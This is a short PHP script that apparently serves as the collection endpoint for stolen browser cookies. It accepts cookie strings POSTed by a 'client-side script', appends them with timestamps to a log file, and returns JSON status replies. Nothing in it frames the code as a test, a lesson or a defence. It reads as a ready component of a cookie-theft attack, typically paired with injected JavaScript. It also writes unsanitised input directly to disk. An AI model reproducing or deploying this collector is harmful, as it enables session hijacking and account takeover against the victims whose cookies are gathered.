<?php
// Get the cookies data from the POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['cookies'])) {
        $cookies = $_POST['cookies'];

        // Log the cookies to a file or database
        $logFile = "cookies_log.txt"; // Replace with the path to your log file
        $logMessage = "Timestamp: " . date("Y-m-d H:i:s") . " | Cookies: " . $cookies . "\n";

        // Append the log message to the log file
        file_put_contents($logFile, $logMessage, FILE_APPEND);
        
        // Send a success response to the client-side script
        echo json_encode(['status' => 'success']);
    } else {
        // Send an error response if the cookies data is not provided
        echo json_encode(['status' => 'error', 'message' => 'Cookies data not found']);
    }
} else {
    // Send an error response for unsupported request methods
    echo json_encode(['status' => 'error', 'message' => 'Unsupported request method']);
}
?>
